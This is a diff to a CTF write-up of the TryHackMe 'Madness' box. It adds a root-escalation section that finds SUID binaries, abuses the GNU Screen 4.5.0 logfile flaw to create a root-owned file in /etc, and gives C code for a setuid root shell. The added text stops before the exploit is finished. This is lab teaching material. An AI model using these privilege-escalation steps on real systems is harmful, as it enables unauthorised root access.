@@ -1,6 +1,6 @@
 # 'Madness' box writeup
 ## Madness is a CTF box created by optional and available on the [TryHackMe platform](https://tryhackme.com).
-## Read about [JPG Signature Format: Documentation & Recovery Example](https://www.file-recovery.com/jpg-signature-format.htm), 
+## Read about [JPG Signature Format: Documentation & Recovery Example](https://www.file-recovery.com/jpg-signature-format.htm), [GNU Screen escalation](https://seclists.org/oss-sec/2017/q1/184)
 # ![bg](images/5iW7kC8.jpg_Min.png?raw=true "Title")
 
 ## Foothold
@@ -115,14 +115,49 @@ done
 
 ``steghide --extract -sf 5iW7kC8.jpg``
 
-# ![12](images/passwordf.jpg?raw=true "pass")
+# ![13](images/passwordf.jpg?raw=true "pass")
 
 + **We got out password now, so let's connect to ssh**
 
 ``ssh youfoundme@10.10.94.80``
 
-# ![12](images/user_flago_re.jpg?raw=true "user_flag")
+# ![14](images/user_flago_re.jpg?raw=true "user_flag")
 
 **We found our first user flag inside our home directory. Let's move on to the root flag**
         
 ## Root escalation
+
++ **Let's start searching for some SUID files**
+
+``find / -perm /4000 2>/dev/null``
+
+# ![15](images/perm.jpg?raw=true "perm")
+
+**We can see the** */bin/screen-4.5.0 **and** */bin/screen-4.5.0.old* **both having SUID permission. Reading the [GNU Screen escalation](https://seclists.org/oss-sec/2017/q1/184) request, we can follow up instructions and see that we can open the logfile with root privileges, this meaning we can create a file, owned by root, which can contain anything. Let's check it out**
+
+``cd /etc``
+``screen -D -m -L test echo "just testing"``
+``ls -l test``
+
+# ![16](images/test.jpg?raw=true "test")
+
++ **And the file owner is root. Let's exploit this vulnerability. Firstly, let's create a C program so we can generate a root shell**
+
+```C
+#include <stdio.h>
+#include <sys/types.h>
+
+int main(void)
+{
+	// set user as root;
+	setuid(0);
+	setgid(0);
+	seteuid(0);
+	setegid(0);
+
+	// spawn a shell;
+	system("/bin/bash");
+}
+```
+
+
